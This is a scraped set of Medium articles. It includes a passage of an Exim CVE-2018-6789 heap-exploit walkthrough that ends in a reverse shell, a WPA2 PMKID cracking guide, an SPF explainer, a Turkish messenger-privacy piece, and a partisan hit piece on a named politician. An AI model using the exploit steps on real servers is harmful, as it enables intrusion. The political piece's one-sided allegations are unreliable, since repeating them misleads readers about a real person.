I did the following to identify the last two based64 characters I needed to decode it to “0xf1”.
2. Compute all the possible values for “y<<4” and “x>>2”.
3. Brute force all entries in “new_table_x” and “new_table_y” such that “x|y” evaluates with a value that ends in “f1”.
I got this output, and select to use “x = 1, y = 752”.
4. Find “x” where “x>>2=1”. I can find “x” since I computed it in the “new_table_x”.
Though manual inspection, index 17, 18, 19, 20 contains the value 1 in “new_table_x”. The corresponding indexes in “table” returns the value 4, 5, 6, 7. Inspecting which indexes in the “dec64table” returns the value 4, 5, 6, 7 are ASCII characters E, F, G, H.
5. The same procedure is applied to find the original value of “y”.
I identified index 60 returns the value 752 in “new_table_y”, and returns value 47 in “table”. The ASCII value P is the original value.
Revised code for the “exploit” method.
Inspecting the memory agrees with me.
In order to free the extended chunk (size: 0x20f0), I have to allocate a 0x2020 block with fake heap header data, to fake a chunk that is below the extended chunk.
0x55d7e5887d00 + 0x20f0 = 0x55d7e5889df0. So the address 0x55d7e5889df0 should be the start of the fake chunk.
Revised code for the “exploit” method.
It takes 8200 decoded base64 characters to fit in a 0x2020 chunk block. The difference between 0x55d7e5889d20 and 0x55d7e5889df0 is 176, so I have to prefix my decoded value with 176 characters.
I create the fake heap meta data:
· Prev_size: 0
· Size: 0x1f50 (the difference between 0x55d7e5889df0 and 0x55d7e588bd40 is 0x1f50)
The suffix of the string are just fillers.
Examining the memory is in agreement with what I want to achieve.
I free the extended chunk by using a 4th “EHLO” command with a small hostname.
Revised code for the “exploit” method.
Debugger output when freeing the 3rd “EHLO” hostname (aka: extended chunk).
The unsorted bin indicates the extended chunk is the first item in the list.
The 4th “EHLO” goes through a series of allocation and deallocation which puts me in this memory layout.
The unsorted bin list.
I observed the following from the heap layout.
1. The extended chunk at address 0x55d7e5587d10 is no longer identified as an individual chunk. It has merged with the chunk 0x55d7e5885ce0 creating a free block of size 0x4110.
2. The fake chunk I created at address 0x55d7e5889df0 which I carved from 0x55d7e5889d20 is now a legit chunk.
3. The chunk at address 0x55d7e5889d20 is no longer identified as an individual chunk. However, it is noted as a free chunk in the unsorted bin. The size of it is 0x3f70.
If I allocate the chunk at address 0x55d7e5889d20, it will overlap BOTH 0x55d7e5887ce0 and 0x55d7e5889df0.
After freeing extended chunk
The unsorted bin after freeing the extended chunk.
In order to allocate the extended super chunk at address 0x55d7e5885ce0, I have to allocate the first three items in the unsorted bin list. One of the item being chunk address 0x55d7e5889d20, which partially overlaps with chunk at address 0x55d7e5889df0. I have to ensure the heap meta-data for chunk 0x55d7e5889df0 is valid, or else, I am unable to allocate the super chunk. Therefore, I have to include heap meta-data in my input for the 0x55d7e5889d20 allocation to patch the header of chunk 0x55d7e5889df0.
For the first and third item in the unsorted bin, I use two unrecognized commands to filler them up.
For the second item, I use a “AUTH PLAIN” command.
The heap meta-data for chunk at address 0x55d7e5889df0 is patched.
The “AUTH PLAIN” command makes additional allocation for expanding strings, which happens to allocate a 0x2020 block from the super extended chunk at address 0x55d7e5885ce0. This leaves me with a free block at 0x55d7e5887d00 of size 0x20f0.
The extended free chunk is the first item on the unsorted bin list.
The extended chunk at address 0x55d7e5887d00 overlaps with 0x55d7e5889d20.
Using a debugger I confirmed the overlapping is true.
The author suggested to allocate the extended chunk and have it overwrite the “next” pointer in the 0x55d7e5889d20 chunk, so the “next” pointer reference a store block that contains ACL.
The start of user control data in a store block is +0x20 offset from the start of the allocated chunk. So the actual starting point I can control for the extended chunk is at address 0x55d7e5887d20.
The offset between 0x55d7e5889d30 (position of next pointer) and 0x55d7e5887d20 is 8208.
Next, I identify the available ACL strings.
I identify which store block the ACL string belongs to through manual inspection.
The starting address from the ACL store block (0x55d7e5864470) that I can control with my user input should start at 0x55d7e5864490.
The offset between 0x55d7e5864490 and 0x55d7e58645b0 is 288.
The ACL store block header starts at 0x55d7e5864480. This is the value I want to overwrite the “next” pointer with.
Lastly, I send another “EHLO” command with a small hostname to force all previous store block to be reset / free. This will free the ACL store block, so I can allocate it later.
Revised code for the “exploit” method.
“next” pointer successfully overwritten.
The ACL store block about to get free.
It should be noted that the author suggested to perform a partial overwrite against the “next” pointer. I did not implement the code to perform partial overwrite. This will be left as an exercise for the reader.
I overwrite the “acl_check_rcpt” with the standard bash reverse shell command.
Revised code for the “exploit” method.
Successfully overwritten the content of “acl_smtp_rcpt”.
The content of “acl_smtp_rcpt” gets evaluated when I send a “RCPT TO” command. The perquisite for the “RCPT TO” command is to send the “MAIL FROM” command first.
Revised code for the “exploit” method.
Breakpoint 1: to observe the “store_malloc” call under “store_get_3” function.
Breakpoint 2: to observe the “store_free_3” call under “store_reset_3” function.
Breakpoint 3: to observe the “store_free” call under “check_ehlo” function.
Breakpoint 4: to observe the “string_copy_malloc” call under the “check_ehlo” function.
[1] https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/
Written by
","['Programming', 'Exploit Development', 'Cybersecurity']"
Myths and Legends of SPF - HackerNoon.com - Medium,https://medium.com/hackernoon/myths-and-legends-of-spf-d17919a9e817?source=tag_archive---------7-----------------------,"SPF is an abbreviation for Sender Policy Framework (SPF) for Authorizing Use of Domains in Email. Email domains use this protocol to specify which Internet hosts are authorized to use this domain in the SMTP HELO and MAIL FROM commands. You do not have to use any additional software to publish the SPF policy and therefore this procedure is extremely simple: Simply add a TXT record containing the policy to the DNS zone. An example of this type of entry is given at the end of this article. There are numerous manuals and even online constructors for working with SPF.
The first ever version of the SPF standard was approved more than 10 years ago. During this time, numerous implementations and application practices have been developed. In addition, a new version of the standard has been released. But the most surprising is that for some reason SPF, more than any other standard, has grown over 10 years with an incredible amount of myths and misconceptions that wander from article to article and with an enviable regularity pop up in discussions and answers to questions on the forums. At the same time, the protocol itself seems very simple: implementation takes only a couple minutes. Let’s try to recall and analyze the most common misconceptions.
TL;DR — please see the recommendations at the end.
Fact: SPF does not protect the sender’s address that is visible to the user.
Explanation: SPF does not work with the contents of the message that the user sees, in particular, the sender’s address. SPF authorizes and verifies addresses at the mail transport level (SMTP) between two MTAs (envelope-from, RFC5321.MailFrom aka Return-Path). These addresses are not visible to the user, and they can differ from those in the From header that the user sees (RFC5322.From). Thus, nothing prevents a message with a fake sender in the ‘From’ header from being authorized with SPF.
Use DMARC to protect visible domain name from spoofing.
Fact: most likely, you will not see any significant changes in terms of security and spam.
Explanation: SPF is originally an altruistic protocol, so it does not provide any advantages to anyone who publishes the SPF policy. Theoretically, if you implemented SPF, this protocol could protect someone else from receiving fake emails from your domain. But in fact, even this assumption is not true, because the results of applying SPF are rarely used directly (we’ll discuss all of this later). Moreover, even if all domains published SPF, and all recipients forbade receiving messages without SPF authorization, such an approach would hardly reduce the amount of spam.
SPF does not protect against spoofing or spam directly, nevertheless, this protocol is actively and successfully used to deploy spam filtering systems, as well as to protect against counterfeit emails, since it allows you to check each message against a specific domain and its reputation.
Fact: It all depends on the type of message, the way it is delivered and your reputation
Explanation: SPF is not meant to affect email deliverability within a standard flow, and adversely impacts the improper implementation or indirect flows of messages, when users receive such messages from a server that differs from that from which the message was sent, for example, this applies to redirected emails. But spam filtering systems and reputation-based classifiers take into account the availability of SPF and reputation of authorizing domain, and this generally gives a positive result with respect to the standard message flow. Unless, of course, you yourself are a spammer.
Fact: SPF provides authorization of the email server that sends a message on behalf of a domain
Explanation: Firstly, SPF works only at the domain level, and not at the level of individual email addresses. Secondly, even if you are a legitimate email user of a specific domain, SPF does not allow you to send messages from anywhere that you wish. In order for your message to successfully pass SPF validation, you must send it only from an authorized server. Thirdly, if you authorized a server using SPF (for example, you could allow sending emails from your domain via any ESP or hosting provider), and this server does not impose any additional restrictions, then all users of this server are authorized to send messages on behalf of your domain. Please keep this in mind when implementing SPF and providing authentication of email messages in general.
Fact: In general, SPF authorization or lack thereof does not have a significant impact on the delivery of email messages.
Explanation: SPF is only an authorization standard, and it explicitly indicates that actions to be applied to email messages that were not authorized are outside the scope of the standard and are governed by the recipient’s local policy. If there is a ban on receiving such messages, this leads to problems with messages going through indirect delivery routes, for example, when using redirection or mailing lists, and you should consider this fact in the local policy. In practice, it is not recommended to use a strict ban in case of an SPF authorization failure. Standard allows (but does not require) strict ban only when the domain publishes the -all (hardfail) policy in the absence of other filters. In most cases, SPF authorization is used as one of the factors in the weighted systems. At the same time, this factor will have an insignificant weight, because violation of SPF authorization is usually not a reliable indicator of spam: many spam messages successfully pass SPF authorization, and legal ones often can not do this, and it is unlikely that we will ever witness cardinal changes in this field. If we look at it this way, there is no difference between -all and ~all.
SPF authorization is not so important in terms of message delivery or spam filtering, but it allows for confirmation of the sender’s address and the relationship with the domain, as well as the use of the reputation of the domain instead of the IP reputation for this message.
DMARC policy has a much more significant influence on the decision-making on further actions in relation to handling a message that has not passed authorization. DMARC allows you to reject (or quarantine) all or part of messages that have not been authorized.
Fact: In fact, -all does not affect security in any way, but it negatively affects the delivery of messages.
Explanation: -all results in the blocking of messages that were sent through indirect routes by those few recipients who use SPF directly and block messages. At the same time, this policy will not have a significant impact on most spam and fake messages. At the moment, ~all (softfail) is considered the most appropriate policy and it is used by almost all large domains, even those that impose very strict security requirements (such as paypal.com). -all can be used for domains that are not used for sending legitimate emails. DMARC considers -, ~ and ? as equivalents.
Fact: It is also necessary to configure SPF for domains that are used in HELO on mail servers. In addition, it is recommended to apply a blocking policy for MX, A records and the wildcard that are not used to send emails.
Explanation: In some cases, in particular, when delivering NDR (a non-delivery report), DSN (delivery status notification) and some auto-responses, the address of the sender in the SMTP envelope (envelope-from) will be empty. In this case, SPF checks the host name from the HELO/EHLO command. You need to check the name from this command (for example, by opening the server configuration or by sending an email to a public server and checking the headers) and enable SPF for this name.
Spammers can use not only the same domains that you use to send messages, they can send spam on behalf of any host that has an A- or MX record. Therefore, if you publish SPF from altruistic considerations, then you need to add SPF for all such records, and it is also desirable to add a wildcard (*) for nonexistent records.
Fact: It must be a TXT record.
Explanation: According to the current version of the SPF standard (RFC 7208), SPF type DNS records are deprecated and should no longer be used.
Fact: it is necessary to minimize the SPF record and it is recommended to specify only addresses of the networks via ip4/ip6.
Explanation: There is a limit of 10 DNS queries for resolving the SPF policy. Exceeding this limit will result in a permanent policy error (permerror). Moreover, DNS is an unreliable service, so there is a probability of a failure (temperror) for each request, which increases with the number of requests. Each additional a or include record requires an additional DNS request; as for include, it is also necessary to request all elements specified in the include record. mx requires to request MX records and an additional A record request for each MX server. ptr requires an additional request, moreover, it is inherently unsafe. Only the addresses of the networks listed through ip4/ip6 do not require additional DNS requests.
Fact: As for most DNS records, it is better to choose TTL from the range of 1 hour to 1 day and reduce it in advance during the deployment or implementation of planned changes, or increase, when the policies are stable.
Explanation: A higher TTL reduces the likelihood of DNS errors and, as a consequence, SPF temperrors, but it increases the response time when it is necessary to make changes to the SPF record.
Fact: A policy with an explicit +all or an implicit rule that enables mailing on behalf of the domain name from any IP address will negatively affect the delivery of emails.
Explanation: Such a policy does not make sense, and it is often used by spammers to ensure SPF authentication of spam messages that are sent through botnets. Therefore, a domain that publishes such a policy risks being blocked.
Fact: It is necessary to use SPF.
Explanation: SPF is one of the mechanisms for authorizing the sender in email and the way to identify the domain in reputation-based systems. Currently, large email service providers are gradually beginning to require the authorization of messages, and messages that do not have authorization can be subject to “penalties” in terms of delivery or display to the user. In addition, there may be no auto-responses and notifications on delivery or non-delivery for messages that have not passed SPF authorization. The reason is that such responses are usually sent exactly to the SMTP envelope address SPF authorizes and require that it is authorized. Therefore, SPF is required even if all messages are authorized by DKIM. Also, SPF is a must for IPv6 networks and cloud services: In such networks, it is almost impossible to use the reputation of IP addresses, and messages from addresses without SPF authorization will, as a rule, not be accepted. In accordance with the standard, one of the primary tasks of SPF is to use the reputation of a domain name instead of the IP reputation.
Fact: DKIM and DMARC are also necessary.
Explanation: DKIM is required to successfully forward email messages. DMARC is required to protect the sender’s address from spoofing. In addition, DMARC allows you to receive reports on violations of the SPF policy.
Fact: The record must be exactly one.
Explanation: This requirement is described in the standard. If there is more than one record, this will result in a permanent error (permerror). If it is necessary to merge several SPF records, simply publish a record with several include operators.
Fact: You should use v=spf1.
Explanation: spf2.0 does not exist. By publishing the spf2.0 record, you can expose yourself to the risk of unpredictable results. spf2.0 has never existed and it is not a standard, but it was mentioned in the experimental standard RFC 4406 (Sender ID), which was based on the assumption that such a standard would be adopted, since the corresponding discussions did take place. Sender ID, which was supposed to solve the problem of address spoofing, did not become a generally accepted standard, and you should use DMARC instead. Even if you decide to use Sender ID and publish the spf2.0 entry, it will not be a replacement for the spf1 entry.
I had almost finished writing this article, when I was suddenly intercepted by our Customer Support staff who strongly (and categorically) recommended that I recall the following nuances of SPF that they often have to deal with when solving various issues:
Sample SPF policy: @ IN TXT “v=spf1 ip4:1.2.3.0/24 include:_spf.myesp.example.com ~all”
Written by
","['About', 'Help', 'Go Home', 'here', 'SPF BCP', 'Email', 'Information Security', 'Cybersecurity', 'Spam', 'Sysadmin']"
My Top 10 Digital Things To Learn in 2019 - ASecuritySite: When Bob Met Alice - Medium,https://medium.com/asecuritysite-when-bob-met-alice/my-top-10-things-to-learn-in-2019-8d37b111c0c1?source=tag_archive---------5-----------------------,"Okay. I’m an academic, so I love learning new things, but it should be part of your world too. A healthy and active mind is one of the best ways to keep yourself healthy overall.
Our life should be built around us continually learning, and never sitting back on our knowledge. So let 2019 be the year that you pushed yourself forward and learnt something new within our digital world. If possible, try and avoid just surface learning, and properly understand the foundation principles of new ways of thinking. It is so easy to sit back and criticise new methods, without actually delving into them and seeing their potential for yourself.
Our world is changing, and there are some things that will transform our understanding of our digital world. So here are my Top 10 things to learn in 2019:
There you go! That was my Top 10 tips.
What will your Top 10 things to learn in 2019 be? Remember don’t just surface learn …
Written by
","['Learn', 'here', 'here', 'Learn', 'Learn', 'learn', 'Security', 'Cybersecurity', 'Cryptography', 'Splunk']"
Neden Whatsapp ve Telegram Kullanmamalısınız? - Bilişim Hareketi - Medium,https://medium.com/bili%C5%9Fim-hareketi/neden-whatsapp-ve-telegram-kullanmamal%C4%B1s%C4%B1n%C4%B1z-e81c0853b73a?source=tag_archive---------7-----------------------,"Bu hafta bilinen ama göz ardı edilen bir konunun daha derine inerek bahsetmeye çalışacağım başlık clickbait değil. Yazının orjinali Romain Aubert tarafından yazıldı bende eklemeler ve çıkarmalar yaparak daha anlaşılır şekilde türkçeleştirdim. Önce teknik birkaç konuyu açıklayacağım.
Bizim farketmeden ve sürekli kullandığımız signal protokolünü her gün 1 milyar kişi ile birlikte kullanıyoruz. Signal Protokolüdediğimiz; WhatsApp, Facebook Messenger, Google Allo ve Signal’ in kendi mesajlaşma uygulaması tarafından kullanılıyor.
Signal protokolü anlık mesajlaşma sohbetleri için uçtan-uca şifreleme sağlayan federal olmayan bir kriptografi protokolüdür. — Vikipedi
Uçtan-uca şifreleme mesajınızın gizli bir mesaja dönüştürülmesini ve ardından sadece son alıcı tarafından deşifre edilmesini sağlar. Whatsapp’ın bir süre önce başlattığı özellik;
Signal protokolü; İlk olarak, 2013 yılında Twitter’ın eski güvenlik şefi Moxie Marlinspiketarafından kurulan ve kar amacı gütmeyen bir grup olan Open Whisper Systems tarafından; Twitter, Open Whisper’ in ilk güvenli mesaj şirketini satın aldıktan sonra oluşturuldu. Open Whisper Systems, Signal protokolü’nün geliştirilmesine odaklandı ve ayrıca Signal adı verilen bir mesajlaşma uygulaması yayınlandı. Şirket bağışve yardımlar sayesinde finanse ediliyor. Ekim 2016′ da Signal Protokolü uluslararası bir güvenlik araştırması takımı tarafından incelendi ve parlak sonuçlar aldı. İnceleyebilirsiniz. Buraya kadar okuduktan sonra WhatsApp, Facebook Messenger, Telegram ve Google Allo; Signal protokolünu kullandığın beri sıkıntı olmadığını düşünebilirsiniz.
Ama bir sorun var..
Facebook Messenger ve Google Allo öntanımlı olarak uçtan-uca şifrelemeyi aktifleştirmiyor. Uçtan-uca şifrelemeyi kullanabilmek için Facebook Messenger kullanıcıları “Gizli Sohbetler” özelliğini Google Allo kullanıcıları ise “Gizli Mod”u aktifleştirmek zorundalar eğer uygulamlar bu bahsettiğimiz özelliği aktif etmezlerse datalar şifresiz olarak havada dolaşır.
Sosyal ağ VK’ nin kurucusu Pavel Durov tarafında kurulan Telegram MProto ismiyle kendi kriptografi protokolünü kullanıyor. Telegram kriptografi konusunda oldukça fazla tartışmaya konu oldu. Ardından 2015′ te bir güvenlik araştırmacısı MProto’nun teorik zayıflıklarını ortaya çıkaran bir belge yayınladı* ve Telegram’ ın kendi kriptografi protokollerini kullanmaması gerektiğini belirtti. Ben buna geri vites diyorum. Bu bize gönderilen mesajlar için Signal protokolünü varsayılan olarak kullanan iki uygulama olan WhatsApp ve Signal’i bırakır. Peki neden WhatsApp’ı kullanmamamız gerektiğini sorabilirsiniz bununda çok sağlam bir sebebi var. WhatsApp’ın metadata toplaması.
Metadata ve veri toplama çoğu kez tartışamaların merkezinde oldu ve halen ivme kazanarak yükselen bir trend. Kullanım şartlarında sıklıkla şu ifadeler geçmektedir.
Biz sizin iletişiminizin içeriğini uçtan-uca şifreleme kullanmamız sebebiyle dinleyemez/okuyamayız. Biz sadece metadata toplarız.
Metadata anlaması biraz zor bir ifade ve üstü kapalı. Edward abimizde tweetinde açıklamış.
“Metadata” ifadesinin ne olduğunu anlamakta sorun mu yaşıyorsunuz. Yerine “aktivite kaydı” koyun. Metadata budur.
Eğer hala ne olduklarını analayamadıysanız; Kurt Opsahl’ın şu yazısını okuyun. Yazıda şirketlerin ve hükümetlerin metadata toplayarak neleri bilebildiklerine örnekler veriliyor. Metadatanın ne olduğunu öğrendiğinize göre tekrar ediyim; uçtan-uca şifreleme mesajlaşma servislerinin metadata toplamasını engellemez.
WhatsApp SSS, uygulamanın adres defterindeki tüm telefon numaralarına erişimi olduğunu ve sizin hakkınızda çok sayıda bilgiyi topladığını bildirmektedir. İlginç olan şey, WhatsApp mesajlarınızı sunucularında saklamamaktır. Bunun yerine, mesajlarınız telefonunuzda ve daha sonra da telefonunuzu yedeklediğiniz sunucularda şifrelenmemiş olarak depolanır. Örneğin, bir iPhone kullanırsanız, tüm WhatsApp iletileriniz iCloud’da şifrelenmemiş olarak depolanır. WhatsApp’ın ne zaman, nerede ve kiminle iletişim kurduğunuz hakkında topladığı bilgiye gelince, bu çok belirsizdir. İşte söyledikleri:
Kullanım ve Kayıt Bilgiler: Servisle ilgili, teşhis ve performans bilgileri toplarız. Bu, etkinliğiniz hakkında (hizmetlerimizi nasıl kullandığınız, hizmetlerimizi kullanarak başkalarıyla nasıl etkileşime geçtiğiniz gibi), kayıt dosyaları ve sorun giderme, çökme, web sitesi ve performans kayıtlarını ve raporlarını içerir.
WhatsApp ayrıca, uygulamayı yüklediğinizde, hizmetine eriştiğinizde veya kullandığınzda; telefonunuzun modeli, işletim sistemi, IP adresiniz, kullandığınız tarayıcı gibi cihaza özgü bilgileri de toplar. Kısaca herşeyi. Ve eğer onlar bu bilgileri telefonunuzdan toplayamazsa, WhatsApp, arkadaşınızın akvite kaydına eriştiği müddetçe biri size mesaj attığı zaman bu bilgileri edinirler. Ne kadar kolay. Şifrelenmemiş yedeklerin yanı sıra, Electronic Frontier Vakfı; WhatsApp web uygulaması ve WhatsApp’ı 2014 yılında satın alan Facebook’la veri paylaşımı üzerine diğer endişelerini de makalesinde özetledi.
Facebook’ tan bahsetmişken ona gelelim…
MIT Technology Review yazdı: Facebook, şimdiye kadar insan sosyal davranışı üzerine en kapsamlı veriyi topluyor. Facebook’un hangi tür verileri depoladığını anlatmama gerek yok. Facebook sizin arkadaşınız, dolayısıyla arkadaşınızın size ne kadar yakın olduğunu çok basit bir şekilde anlatmışlar.
Facebook Veri İlkesi’ne buradan ulaşabilirsiniz: https://www.facebook.com/privacy/explanation
Google Allo, güvenlik uzmanları tarafından genişçe eleştirildi. Google, sadece gönderdiğin mesajları okumaz, aynı zamanda tüm konuşmalarını saklar. Bu kadar basit. İşte Edward Snowden’in Allo için yaptığı reklam:
Google Mail, Google Haritalar ve Google Gözetleme. Allo’yu kullanmayın.
Telegram kriptografi protokolünde bazı teorik güvenlik açıkları olduğunu belirtildiğinden beri biraz zor durumda. Ancak bunu bir kenara bırakalım ve sizden ne topladıklarına bir bakalım.Mesajlar, fotoğraflar, videolar ve belgeler şifreli bir şekilde Telegram’ ın sunucularında depolanmakta(“Gizli Sohbet” mesajları hariç, onlar Telegram sunucusunda depolanmamakta). Facebook ve WhatsApp gibi Telegram da kişilerinize erişiyor ve onları sunucularında depoluyor. Bu kişilerinizden biri Telegrama katıldığında size nasıl bildirim gönderildiğini açıklıyor değil mi?
Signal’ in elinde tuttuğu tek veri, kaydettiğiniz telefon numarası ve sunucuya en son ne zaman giriş yaptığınızdır.Bu kadar.Hata o mesajı attığınız; saati, dakikayı, ve saniyeyi de depolamıyor. Yalnızca mesajı attığınız günü depoluyor.Eğer kendinizi yine de güvende hisstemiyorsaniz Signal’ in mesajlarınızın belli bir zaman sonra karşı taraftan silinmesini sağlayan; “yok olan mesajlar” adını verdiği bir özelliğide var.Ve Signal bedava, cidden bedava. Yani Facebook ve Telegram’ ın yaptığı ve Google’ ın kendi uygulamalarında yapmak istediği gibi gözünüzü reklamcılar için bir ürüne dönüştürmüyorlar. Buradan Signal’ e bağış yapabilirsiniz.Bu arada eğer bakmak isterseniz Signal’ in kaynak kodu açık ve bedava bir şekilde GitHub’ da yayınlanıyor.
Belki şöyle düşünebilirsiniz: Bu beni ilgilendirmez, benim gizleyecek hiçbir şeyim yok. Eğer gizliliğinizin önemli olmadığını düşünüyorsanız.
Bu yazının Romain Aubert tarafından yazılıp Free Code Camp’te yayınlanmış olan yazı olduğunu unutmayın. Ben detaylı kısımları inceleyip sizler için tekar düzenledim merak edenler için bir okyanus bağlantı linki bıraktım. Yolun bu kısmından sonra katırlarla devam edeceğiz.
Hoşçakalın.
Written by
","['ENDÜSTRİ 4.0', 'YAZILIM', 'YAPAY ZEKA', 'BLOCKCHAIN', 'YAZARLIK', 'Glenn Greenwald', 'Quincy Larson', ' makalesini', 'Fabio Esteves', 'Technology', 'Cybersecurity', 'Siber Guvenlik', 'Internet', 'Social Media']"
New attack on WPA/WPA2 using PMKID - Adam Toscher - Medium,https://medium.com/@adam.toscher/new-attack-on-wpa-wpa2-using-pmkid-96c3119f7f99?source=tag_archive---------4-----------------------,"New attack on WPA/WPA2 using PMKID
In this short blog, I will walk you through the process of obtaining a valid PMKID packet, and converting those frames of data to hashcat format for cracking. This is a new way to recover the WPA2-PSK passphrases from vulnerable devices, that doesn’t require station <->client interaction or a 4-way handshake.
Checklist:
Linux — Debian
Supported adapters (strict)
Out of all the cards mentioned, in my preliminary testing I found the older AWUS036H card I bought in 2012 to work the best.
Both Alfa USB devices work well. Preliminary results show better performance, with the AWUS036H . I was able to obtain multiple PKMID frames within seconds sometimes from a vulnerable access point . The older Alfa AWUS036H is a also a more powerful card and works better with nosier conditions.
Vulnerable Linksys E4200 router with WPA2-PSK authentication enabled
Walk-through:
Details to be noted:
Ensure you specify the correct channel when passing that value to “-c” to the Access Point you are targeting.
4. Hashchat
We can download the newly updated https://hashcat.net/hashcat/ V4.2.0 which cracks two new hash types:
The files have been copied to a windows host and “cracked” below for illustration purposes only. Since it’s a single hex encoded string, it’s much easier to copy and mange between different hosts.
Written by
","['Wireless', 'Cybersecurity']"
NOT HERE FOR PROGRESS: Meet the Tea Party-esque insurgency seeking to “rebuild the Democratic Party from scratch”,https://medium.com/@PortlusGlam/not-here-for-progress-meet-the-tea-party-esque-insurgency-seeking-to-rebuild-the-democratic-party-669542298044?source=tag_archive---------3-----------------------,"Over a few short months, a media blitz has transformed little-known Bronx congressional candidate Alexandria Ocasio-Cortez into the fresh new face of progressive politics in America. However, independent research into her background and funding has revealed “Democratic Socialist” Ocasio-Cortez is neither a progressive Democrat nor a good faith candidate. And for someone with an economics degree — one of the only claims on her resume that checks out — the 28-year-old candidate has a lot to learn about campaign finance and election law.
At any other time, Ocasio-Cortez’ myriad red flags — her unlikely victory, antagonistic rhetoric, national amplification, and shady funding — would beg media scrutiny. After all, the pattern eerily follows that of the Tea Party movement that began in 2010 as a “conservative” backlash to Republican losses. This new breed of supposed “progressives” — with their radicalized, anti-establishment fervor — appear to have more in common with that far-right insurgency than either group has with mainstream American politics.
But we are not living in ordinary times — a situation Ocasio-Cortez and her “progressive” posse are all too willing to exploit to accomplish their destructive goals. As natural as any evolution, the “Bernie or Bust” influence operation that infected our 2016 election is alive, well, and adapted for survival. It’s new useful idiots are Ocasio-Cortez and the murky entanglement of two new Political Action Committees (PACs)— founded by The Young Turks’ scandal-plagued host Cenk Uygur and a group of tech-savvy ex-Bernie campaign staffers.
There are only three qualifications to become a Representative in the United States Congress: be at least 25 years old, a citizen for seven years, and reside in the state at the time elected. Still, Americans have come to expect a certain level of professional accomplishment from their candidates. A fact check of Ocasio-Cortez’ biography reveals that much of her background as a “young entrepreneur” appears entirely contrived.
For instance, Ocasio-Cortez lists herself as Founder of “Brook Avenue Press” on Financial Disclosure Reports. In media coverage, the company is described as a publishing house that develops urban literature for children. In reality, the venture was an idea then 22-year-old Ocasio-Cortez had in 2012, when she rented a $195/month workspace from the now-defunct Sunshine Bronx Business Incubator. The corporation was dissolved or annulled in October 2016 due to inactivity, the web domain is for sale, and no published literature by the company could be found.
In her Boston University alumni bio, Ocasio-Cortez also bills herself as Lead Educational Strategist for GAGEis. A study of this Delaware LLC is a pandora’s box of bizarre revelations. The company is owned by Cheni Yerushalmi, an Israeli “serial entrepreneur” who also owned the failed Sunshine Bronx Business Incubator. According to Yerushalmi’s LinkedIn profile, the self-described “visionary” leads a “collective of professionals, entrepreneurs, artists and students of life” who gather on a commune in Bridgewater, Vermont called “The PYNK Community.” The town newspaper reports that Vermont locals have not been thrilled with the “party house,” which “sits on 21 acres and has four bonfire pits, a house they call ‘the Cabin’, a giant 22-foot ‘sacred’ teepee and a separate farmhouse. The property is worth about $825,000.” While her association with Yerushalmi suggests Ocasio-Cortez is a disciple of this business “guru”, it is unclear what real work GAGEis does — the website archives to an error and his $30/hr Upwork profile has no hours billed.
The inconsistencies don’t end there. In Ocasio-Cortez’ New York City Campaign Finance Board profile, she claimed to have been a “Foreign Affairs & Immigration Liaison” for Ted Kennedy, who died in 2009 when Ocasio-Cortez was 19 years old. This has been described elsewhere as a college internship. She also lists previous occupations as “Microfinance Practitioner and Maternal Health Study— Niger, West Africa” and “Metrics & Social Design — The Purpose Economy; Imperative”, both of which appear to have been undergrad experiences.
The only claim that does check out is Ocasio-Cortez’ work with the National Hispanic Institute. She lists herself as an “Educational Director” on her Financial Disclosure with a 401K but no reported income. Recently, she was named “2017 Person of the Year” by the organization. A feature article on their site suggests she has had a relationship with the organization since high school and that her position is a volunteer one.
All said, Ocasio-Cortez only earned income from her food service positions in 2016 and 2017, totaling around $43,000 and $27,000 respectively.
Is Ocasio-Cortez really from the Bronx?
It’s difficult to confirm more about Ocasio-Cortez’ background since the candidate’s previous twitter account appears to have been deleted, her LinkedIn profile is essentially blank, and web archives for her campaign show a changing story over time. But residency information can be gleaned by fact-checking her current campaign bio against prior statements.
Ocasio-Cortez has claimed to be a “third-generation Bronxite” from a “working class” family. An enormous part of her aggressive rhetoric against incumbent Joe Crowley concerned the 10-term congressman living outside his district. Yet in the profile Ocasio-Cortez used to launch her candidacy, she wrote: “we started our journey in the Bronx, but were forced to leave our neighborhood in search of public schools with more to offer than a 50% dropout rate.” She graduated from the predominately white Yorktown High School located in Yorktown Heights, NY, where the average household income is $141,254 and average household net worth is $1,192,838.
In 2016, Ocasio-Cortez was quoted in a Think Progress article where she was described as a “Westchester County voter.” The article referenced a Reddit post where she wrote of her 2012 post-Hurricane Sandy voting issues: “I was stuck in NYC and voted outside my precinct, and apparently when I signed that affidavit my party affiliation was waived.”
It is also uncertain whether running in the Bronx 14th district was Ocasio-Cortez’ first choice. Her initial Statement of Candidacy submitted to the Federal Election Commission (FEC) listed her running in the 15th. It was amended shortly thereafter.
So who vetted Ocasio-Cortez?
After serving as a volunteer field organizer for Bernie Sanders 2016 Campaign, Ocasio-Cortez was recruited by Justice Democrats — a hostile and shady PAC launched in January 2017 by The Young Turks’ scandal-plagued creator Cenk Uygur and Saikat Chakrabarti, the former Director of Organizing Technology for Sanders’ campaign. Justice Democrats are closely affiliated with Brand New Congress, another PAC launched by Chakrabarti in April 2016 alongside former senior Sanders adviser Zack Exley and former Sanders campaign coordinator Corbin Trent.
Both Justice Democrats and Brand New Congress were founded with the goal of harnessing the momentum and fundraising muscle of the Sanders campaign. A review of the core staff reveals significant crossover and a musical chairs of board members between the two. Ocasio-Cortez assumed a leadership role with Justice Democrats sometime in 2017 — thereby effectively vetting herself for the role of candidate.
Until July, Ocasio-Cortez was listed as one of two board members for Justice Democrats, whose PAC mission at the time of launch stated:
“The solution is not unity with the corporate-backed Democrats…It’s time to rebuild the Democratic Party from scratch.”
Operationally, the PAC sought to recruit, train, and run candidates across the country to primary incumbent Democrats — not because they themselves were Democrats, but because “it is next to impossible for a third-party candidate to win a national election.” Justice Democrats website includes the disclaimer it is “not authorized by any candidate or candidate’s committee.” Yet Ocasio-Cortez held legal control over the dubious fundraising entity while simultaneously running as a PAC-endorsed candidate — even filing her Statement(s) of Candidacy from their Knoxville, TN address.
Brand New Congress, the PAC we now see Ocasio-Cortez criss-crossing the country helping to promote, has the perplexing mission of “attempting to recruit Congressional candidates to run as Republicans in red districts.” And while Ocasio-Cortez’ has been criticized for her post-primary national campaigning, that appears baked into the strategy with Brand New Congress. In a 2017 interview, Trent explained:
“our goal is to nationalize those races and to really frame a narrative around these representatives that they aren’t just representing their district, which is a very big part of it, but they’re also representing the rest of America with their votes. So I think that our ability to organize…and distribute in an effective way is going to allow us to nationalize more effectively.”
Where did all the money go?
